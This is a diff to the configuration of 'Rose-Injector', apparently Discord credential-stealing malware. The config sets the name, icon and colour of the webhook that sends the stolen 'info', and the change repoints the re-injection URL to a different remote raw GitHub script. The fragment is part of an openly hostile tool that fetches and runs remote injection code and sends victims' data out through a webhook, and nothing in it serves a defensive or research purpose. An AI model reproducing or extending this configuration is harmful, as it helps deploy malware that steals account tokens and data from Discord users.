@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Rose-Injector', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1020474639874539560/1036386536658313216/static_6.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/YouCantFindIt/forbidden/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
